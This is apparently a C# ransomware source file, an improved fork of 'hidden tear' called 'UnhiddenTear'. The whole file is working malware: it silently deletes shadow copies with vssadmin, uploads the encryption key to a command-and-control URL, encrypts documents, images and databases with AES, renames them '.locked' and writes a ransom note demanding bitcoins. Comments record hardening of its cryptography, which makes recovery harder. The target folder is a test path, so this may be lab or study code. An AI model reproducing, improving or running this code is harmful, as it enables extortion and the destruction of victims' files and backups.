using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Konscious.Security.Cryptography;

namespace UnhiddenTear
{
    public class Encryptor
    {
        //Url to send encryption password and computer info
        string targetURL = "https://www.example.com/hidden-tear/write.php?info=";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";


        public void Run()
        {
            string password = CreatePassword(15);
            string path = "\\Desktop\\test";
            string startPath = userDir + userName + path;
            DeleteShadowCopies();
            byte[] argon2Key = DeriveArgon2Key(password);
            SendKey(argon2Key);
            encryptDirectory(startPath,argon2Key);
            messageCreator();
        }
        
        
        
        
        //creates random password for encryption
        //DONE: changed to a CSPRG
        private string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            while (0 < length){
                var randomNumber=BitConverter.ToInt16(RandomNumberGenerator.GetBytes(2));
                if (randomNumber < 69 && randomNumber>-1)
                {
                    res.Append(valid[randomNumber]);
                    length--;
                }
            }
            return res.ToString();
        }

        private byte[] DeriveArgon2Key(string password)
        {
            byte[] saltBytes = RandomNumberGenerator.GetBytes(16);
            var argon2 = new Argon2id(Encoding.UTF8.GetBytes(password));

            argon2.Salt = saltBytes;
            argon2.DegreeOfParallelism = Environment.ProcessorCount; //all cores
            argon2.Iterations = 6;
            argon2.MemorySize = 1024 * 1024; // 1 GB

            var key= argon2.GetBytes(32);
            return key;
        }
        
        

        private void DeleteShadowCopies()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C vssadmin.exe Delete Shadows /All /Quiet";
            process.StartInfo = startInfo;
            process.Start();
        }

        
        
        
        
        //encrypts target directory
        private void encryptDirectory(string location, byte[] key)
        {

            //extensions to be encrypt
            var validExtensions = new List<string>
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql",
                ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };

       
            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++){
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i],key);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++){
                encryptDirectory(childDirectories[i],key);
            }


        }

        
        //AES encryption algorithm
        //DONE:
        //1. randomized the salt
        //2. changed IV at every iteraction by randomizing it, instead of deriving it from the key. then append it to the encrypted blob.
        //3. replaced PBKDF2 key derivation with Argon2
        private EncryptedFileDTO AES_Encrypt(byte[] bytesToBeEncrypted, byte[] key)
        {
            byte[] encryptedBytes = null;
            byte[] IV = RandomNumberGenerator.GetBytes(16);
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    AES.Key = key;
                    AES.IV = IV;

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return new EncryptedFileDTO(encryptedBytes, IV);
        }



        //Sends key to C&C server
        private void SendKey(byte[] key)
        {
            new System.Net.WebClient().UploadString(targetURL,Encoding.UTF8.GetString(key));
        }

        //Encrypts single file
        private void EncryptFile(string file, byte[] key)
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            EncryptedFileDTO encryptedFileDto = AES_Encrypt(bytesToBeEncrypted, key);
            byte[] bytesEncrypted = encryptedFileDto.encryptedData.Concat(encryptedFileDto.IV).ToArray();
            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file+".locked");
        }





        private void messageCreator()
        {
            string path = "\\Desktop\\test\\READ_IT.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
            System.IO.File.WriteAllLines(fullpath, lines);
        }
    }
}